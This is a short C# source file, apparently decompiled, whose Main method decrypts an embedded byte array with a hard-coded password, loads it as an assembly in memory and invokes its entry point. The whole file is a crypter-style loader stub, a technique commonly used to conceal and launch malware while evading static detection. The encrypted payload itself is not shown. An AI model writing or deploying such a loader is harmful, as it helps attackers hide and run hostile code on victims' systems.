using System.Reflection;
using ns0;
using ns1;

namespace ns2;

internal static class Class2
{
	private static void Main()
	{
		byte[] rawAssembly = Class1.smethod_1(Class0.smethod_1(), "ThisIsAVerySecurePassword!1");
		Assembly assembly = Assembly.Load(rawAssembly);
		MethodInfo entryPoint = assembly.EntryPoint;
		if ((object)entryPoint != null)
		{
			object obj = assembly.CreateInstance(entryPoint.Name);
			entryPoint.Invoke(obj, null);
		}
	}
}
